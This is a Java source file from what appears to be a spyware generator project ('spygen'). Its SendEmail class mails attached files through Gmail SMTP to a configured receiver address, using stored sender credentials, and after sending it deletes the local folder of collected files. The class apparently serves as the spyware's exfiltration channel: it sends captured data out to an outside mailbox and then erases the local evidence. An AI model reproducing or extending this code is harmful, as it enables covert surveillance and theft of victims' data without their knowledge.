package com.houarizegai.spygen.mail;

import com.houarizegai.spygen.global.Settings;
import com.houarizegai.spygen.global.Utils;
import jdk.nashorn.internal.objects.Global;
import org.apache.commons.mail.EmailAttachment;
import org.apache.commons.mail.EmailException;
import org.apache.commons.mail.MultiPartEmail;

import java.io.File;

public class SendEmail {
    
    private static final String SMTP = "SMTP.gmail.com";
    private static final String PORT = "587";
    private static final boolean SSL = true;
    private static final boolean DEBUG = false;

    private MultiPartEmail email;

//    public void sendSimpleEmail(String subject, String msg) {
//        SimpleEmail email = new SimpleEmail();
//        try {
//            email.setDebug(DEBUG);
//            email.setHostName(SMTP);
//            email.setSSL(true);
//            email.addTo(Settings.receiverMail);
//            email.setFrom(Settings.senderMail);
//            email.setAuthentication(Settings.senderMail, Settings.senderPassword);
//            email.setSubject(subject);
//            email.setMsg(msg);
//            email.send();
//        } catch (EmailException e) {
//            e.printStackTrace();
//        }
//    }

    public SendEmail(String subject, String msg) {
        try {
            email = new MultiPartEmail();
            email.setDebug(DEBUG);
            email.setHostName(SMTP);
            email.setSSL(SSL);
            email.addTo(Settings.receiverMail);
            email.setFrom(Settings.senderMail);
            email.setAuthentication(Settings.senderMail, Settings.senderPassword);
            email.setSubject(subject);
            email.setMsg(msg);
        } catch(EmailException ee) {
            ee.printStackTrace();
        }
    }

    public void attach(String file, String description) {
        File f = new File(file);
        EmailAttachment attachment = new EmailAttachment();
        attachment.setPath(f.getPath());
        attachment.setDisposition(EmailAttachment.ATTACHMENT);
        attachment.setDescription(description);
        attachment.setName(f.getName());
        try {
            this.email.attach(attachment);
        } catch (EmailException se) {
            se.printStackTrace();
        }
    }

    public void send() {
        System.out.println("try to send ...");
        try {
            email.send();
            System.out.println("Success send it !");

            Utils.deleteFolderContent(new File(Settings.savePath + Settings.APP_NAME));
        } catch (EmailException e) {
            System.out.println("Error sending !");
            e.printStackTrace();
        }
    }
}